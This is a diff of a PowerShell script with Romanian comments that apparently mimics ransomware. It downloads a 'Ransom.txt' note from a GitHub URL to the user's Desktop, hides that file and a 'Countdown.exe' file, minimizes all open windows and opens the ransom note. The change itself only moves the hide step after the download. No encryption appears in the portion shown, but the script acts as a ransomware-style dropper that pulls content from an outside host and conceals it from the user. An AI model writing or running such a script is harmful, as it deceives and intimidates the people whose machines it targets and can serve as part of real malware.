@@ -44,9 +44,6 @@ $webClient.DownloadFile($url, $output)
 # Ascunde "Countdown.exe"
 Set-ItemProperty -Path "$env:USERPROFILE\Desktop\Countdown.exe" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
-# Ascunde "Ransom.txt"
-Set-ItemProperty -Path "$env:USERPROFILE\Desktop\Ransom.txt" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-
 # Minimizeaza toate aplicatiile care ruleaza
 $shell = New-Object -ComObject Shell.Application
 $shell.MinimizeAll()
@@ -153,6 +150,9 @@ $url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Ransom.txt"
 $output = "$env:USERPROFILE\Desktop\Ransom.txt"
 $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile($url, $output)
+
+# Ascunde "Ransom.txt"
+Set-ItemProperty -Path "$env:USERPROFILE\Desktop\Ransom.txt" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
 # Acceseaza Ransom.txt
 Invoke-Item "$env:USERPROFILE\Desktop\Ransom.txt"
